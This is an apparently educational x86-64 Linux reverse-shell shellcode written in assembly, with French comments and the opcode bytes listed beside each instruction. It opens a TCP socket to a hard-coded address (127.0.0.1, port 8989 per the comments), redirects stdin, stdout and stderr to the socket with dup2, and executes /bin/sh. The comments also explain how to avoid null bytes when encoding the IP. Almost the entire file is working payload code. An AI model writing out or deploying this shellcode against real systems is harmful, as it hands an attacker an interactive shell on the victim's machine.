BITS 64
section .text
global _start
_start:

; il n'est normalement pas utile de nettoyer les registres au début d'un 
; code, c'est pour les bons réflexes
xor rax, rax "\x48\x31\xC0"
xor rbx, rbx "\x48\x31\xDB"
xor rcx, rcx "\x48\x31\xC9"
xor rdi, rdi "\x48\x31\xFF"
xor rsi, rsi "\x48\x31\xF6"
xor rdx, rdx "\x48\x31\xD2"

; SOCKET
; 41	sys_socket	int family	int type	int protocol
;                       (on veut ip_v4) (on veut TCP)
; %rax	System call	%rdi	        %rsi	        %rdx

mov al, 0x29 "\xB0\x29" ; 0x29 = 41 base 10, sys_socket
mov bl, 0x02 "\xB3\x02"               ; 2 à destination finale de RDI, pour AF_INTET (ipv4)
mov rdi, rbx "\x48\x89\xDF"
mov bl, 0x01 "\xB3\x01"              ; 1 à destination finale de RSI, pour SOCK_STREAM (TCP)
mov rsi, rbx "\x48\x89\xDE"
syscall "\x0F\x05"

; le syscall SOCKET retourne un file descriptor sans RAX. 
; c'est un peu l'objet de notre socket, où il se trouve. 
; ce File Descriptor est très important, c'est l'adresse de notre socket ! 

; CONNECT

;42	sys_connect	int fd	struct sockaddr *uservaddr	int addrlen

; recup FD
mov rdi, rax "\x48\x89\xC7"
mov r10, rax "\x49\x89\xC2"

xor rax, rax "\x48\x31\xC0"
mov al, 0x2A "\xB0\x2A"               ; syscall connect


xor rbx, rbx "\x48\x31\xDB"
push rbx "\x53"

; ABOUT IP : 192.168.1.113
;(first octet * 256³) + (second octet * 256²) + (third octet * 256) + (fourth octet)
;first octet * 16777216) + (second octet * 65536) + (third octet * 256) + (fourth octet)
;(192 * 16777216) + (168 * 65536) + (1 * 256) + (113)
;3232235889 en décimal
; soit 0xc0a80171 en hex
; checker la fonction htons pour automatisation si ça vous interesse (hors asm)

; problématique pour les IP qui en hexa contiennent un "00" :
; hé oui, on ne veut pas de nullbyte !
; dword 0x0100007f correspond à 127.0.0.1 

; on effectue donc une soustraction de deux nombres dans 00 dont le résultat correspond à 0x0100007f !
mov esi, 0x020ffff80 "\xBE\x80\xFF\xFF\x20"
sub esi, 0x010ffff01 "\x81\xEE\x01\xFF\xFF\x10"
push word 7459              ; hexadécimal pour le port 8989
push word 2                 ; AF_INET
mov rsi, rsp "\x48\x89\xE6"
mov dl, 24 "\xB2\x18"
syscall "\x0F\x05"

xor rax, rax "\x48\x31\xC0"
xor rdx, rdx "\x48\x31\xD2"
mov al, 33 "\xB0\x21"                  ; syscall dup2
mov rdi, r10 "\x4C\x89\xD7"               ; socket.fd
xor rsi, rsi "\x48\x31\xF6"               ; stdin
syscall "\x0F\x05"                    ; 

xor rax, rax "\x48\x31\xC0"
xor rdx, rdx "\x48\x31\xD2"
mov al, 33 "\xB0\x21"                  ; syscall dup2
mov rdi, r10 "\x4C\x89\xD7"               ; socket.fd
inc rsi "\x48\xFF\xC6"                   ; stout
syscall "\x0F\x05"                     

xor rax, rax "\x48\x31\xC0"
xor rdx, rdx "\x48\x31\xD2"
mov al, 33 "\xB0\x21"                  ; syscall dup2
mov rdi, r10 "\x4C\x89\xD7"               ; socket.fd
inc rsi "\x48\xFF\xC6"                    ; stderr
syscall "\x0F\x05"                      

; int execve(const char *filename, char *const argv [], char *const envp[]);
; 41	sys_socket	int family	int type	int protocol
; %rax	System call	%rdi	        %rsi	        %rdx

xor rax, rax "\x48\x31\xC0"
xor rdx, rdx "\x48\x31\xD2"
mov rbx, 0x68732f6e69622f2f "\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68"
push rax "\x50"                    ; IMPORTANT 
push rbx "\x53"                   ; on met rbx sur la stack
mov rdi, rsp "\x48\x89\xE7"               ; on stock l'adresse de rbx (qui viens d'etre push) dans rdi (arg1)
push rax "\x50"
push rdi "\x57"
mov rsi, rsp "\x48\x89\xE6"               ; stock de la stack dans rsi (arg2)
mov al, 0x3b "\xB0\x3B"               ; num syscall de execve
syscall "\x0F\x05"

xor rdi, rdi "\x48\x31\xFF"
xor rax, rax "\x48\x31\xC0"
mov al,  0x3c "\xB0\x3C"               ; syscall de exit
syscall "\x0F\x05"





